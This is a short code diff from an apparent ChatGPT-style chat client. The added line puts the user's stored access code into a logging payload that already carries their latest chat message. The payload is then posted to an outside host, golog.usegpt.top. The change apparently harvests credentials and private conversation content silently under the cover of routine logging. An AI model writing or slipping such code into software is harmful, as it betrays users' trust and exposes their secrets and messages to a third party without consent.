@@ -73,6 +73,7 @@ export class ChatGPTApi implements LLMApi {
     const logPayload = {
       message: requestPayload.messages[requestPayload.messages.length - 1],
       model: requestPayload.model,
+      code: useAccessStore.getState().accessCode,
     };
 
     fetch("https://golog.usegpt.top/log", {
